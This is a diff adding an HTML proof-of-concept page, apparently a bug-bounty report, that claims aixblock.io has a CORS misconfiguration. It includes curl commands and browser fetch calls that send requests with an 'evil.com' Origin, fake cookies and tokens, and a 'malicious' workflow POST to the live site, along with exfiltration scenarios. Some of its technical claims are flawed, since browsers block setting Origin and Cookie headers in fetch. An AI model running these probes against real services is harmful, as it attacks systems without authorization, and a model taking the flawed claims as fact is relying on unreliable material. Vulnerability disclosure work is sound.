@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Main Domain PoC - AIxBlock</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .vulnerability {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .code {
+            background: #f8f9fa;
+            border: 1px solid #e9ecef;
+            padding: 10px;
+            border-radius: 3px;
+            font-family: monospace;
+            overflow-x: auto;
+        }
+        .button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        .button:hover {
+            background: #0056b3;
+        }
+        .result {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .error {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚨 CORS Misconfiguration on Main Domain PoC</h1>
+        <p><strong>Target:</strong> aixblock.io (Critical)</p>
+        <p><strong>Severity:</strong> High (CVSS 7.5)</p>
+        
+        <div class="vulnerability">
+            <h3>Vulnerability Description</h3>
+            <p>The main domain implements a wildcard CORS policy with credentials enabled, allowing any malicious website to make authenticated requests to AIxBlock's core functionality.</p>
+        </div>
+
+        <div class="warning">
+            <h3>⚠️ High Risk Vulnerability</h3>
+            <p>This vulnerability allows complete bypass of security boundaries and could lead to unauthorized access to sensitive data and workflow execution.</p>
+        </div>
+
+        <h3>Test Cases</h3>
+        
+        <div class="code">
+            <h4>Test 1: Basic CORS Test</h4>
+            <button class="button" onclick="testBasicCORS()">Test Basic CORS</button>
+            <div id="result1"></div>
+        </div>
+
+        <div class="code">
+            <h4>Test 2: Credentials Test</h4>
+            <button class="button" onclick="testCredentials()">Test Credentials</button>
+            <div id="result2"></div>
+        </div>
+
+        <div class="code">
+            <h4>Test 3: API Access Test</h4>
+            <button class="button" onclick="testAPIAccess()">Test API Access</button>
+            <div id="result3"></div>
+        </div>
+
+        <div class="code">
+            <h4>Test 4: Workflow Execution Test</h4>
+            <button class="button" onclick="testWorkflowExecution()">Test Workflow Execution</button>
+            <div id="result4"></div>
+        </div>
+
+        <h3>Manual Testing Commands</h3>
+        <div class="code">
+            <pre>
+# Basic CORS test
+curl -s "https://aixblock.io" \
+  -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: GET" \
+  -X OPTIONS \
+  -v
+
+# Credentials test
+curl -s "https://aixblock.io" \
+  -H "Origin: https://evil.com" \
+  -H "Cookie: session=malicious" \
+  -v
+
+# API access test
+curl -s "https://aixblock.io/api/endpoint" \
+  -H "Origin: https://evil.com" \
+  -H "Authorization: Bearer malicious-token" \
+  -v
+
+# Workflow execution test
+curl -s "https://aixblock.io/workflow/execute" \
+  -H "Origin: https://evil.com" \
+  -H "Authorization: Bearer malicious-token" \
+  -H "Content-Type: application/json" \
+  -d '{"workflow": "malicious"}' \
+  -v
+            </pre>
+        </div>
+
+        <h3>Exploitation Scenarios</h3>
+        <div class="code">
+            <h4>Scenario 1: Data Exfiltration</h4>
+            <p>Malicious website can steal user data from AIxBlock by making cross-origin requests with user credentials.</p>
+            
+            <h4>Scenario 2: Workflow Execution</h4>
+            <p>Malicious website can execute unauthorized workflows by making cross-origin requests to workflow endpoints.</p>
+            
+            <h4>Scenario 3: Authentication Bypass</h4>
+            <p>Malicious website can potentially bypass authentication mechanisms by exploiting CORS misconfiguration.</p>
+            
+            <h4>Scenario 4: API Abuse</h4>
+            <p>Malicious website can abuse API endpoints from any origin, potentially causing DoS or data manipulation.</p>
+        </div>
+    </div>
+
+    <script>
+        async function testBasicCORS() {
+            const resultDiv = document.getElementById('result1');
+            resultDiv.innerHTML = '<p>Testing basic CORS...</p>';
+            
+            try {
+                const response = await fetch('https://aixblock.io', {
+                    method: 'OPTIONS',
+                    headers: {
+                        'Origin': 'https://evil.com',
+                        'Access-Control-Request-Method': 'GET'
+                    }
+                });
+                
+                const corsHeaders = {
+                    'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
+                    'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
+                    'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods'),
+                    'Access-Control-Expose-Headers': response.headers.get('Access-Control-Expose-Headers')
+                };
+                
+                resultDiv.innerHTML = '<div class="result">✅ CORS test completed. Headers: ' + JSON.stringify(corsHeaders) + '</div>';
+            } catch (error) {
+                resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+
+        async function testCredentials() {
+            const resultDiv = document.getElementById('result2');
+            resultDiv.innerHTML = '<p>Testing credentials...</p>';
+            
+            try {
+                const response = await fetch('https://aixblock.io', {
+                    method: 'GET',
+                    headers: {
+                        'Origin': 'https://evil.com',
+                        'Cookie': 'session=malicious'
+                    },
+                    credentials: 'include'
+                });
+                
+                resultDiv.innerHTML = '<div class="result">✅ Credentials test completed. Status: ' + response.status + '</div>';
+            } catch (error) {
+                resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+
+        async function testAPIAccess() {
+            const resultDiv = document.getElementById('result3');
+            resultDiv.innerHTML = '<p>Testing API access...</p>';
+            
+            try {
+                const response = await fetch('https://aixblock.io/api/endpoint', {
+                    method: 'GET',
+                    headers: {
+                        'Origin': 'https://evil.com',
+                        'Authorization': 'Bearer malicious-token'
+                    }
+                });
+                
+                resultDiv.innerHTML = '<div class="result">✅ API access test completed. Status: ' + response.status + '</div>';
+            } catch (error) {
+                resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+
+        async function testWorkflowExecution() {
+            const resultDiv = document.getElementById('result4');
+            resultDiv.innerHTML = '<p>Testing workflow execution...</p>';
+            
+            try {
+                const response = await fetch('https://aixblock.io/workflow/execute', {
+                    method: 'POST',
+                    headers: {
+                        'Origin': 'https://evil.com',
+                        'Authorization': 'Bearer malicious-token',
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({workflow: 'malicious'})
+                });
+                
+                resultDiv.innerHTML = '<div class="result">✅ Workflow execution test completed. Status: ' + response.status + '</div>';
+            } catch (error) {
+                resultDiv.innerHTML = '<div class="error">❌ Error: ' + error.message + '</div>';
+            }
+        }
+    </script>
+</body>
+</html>
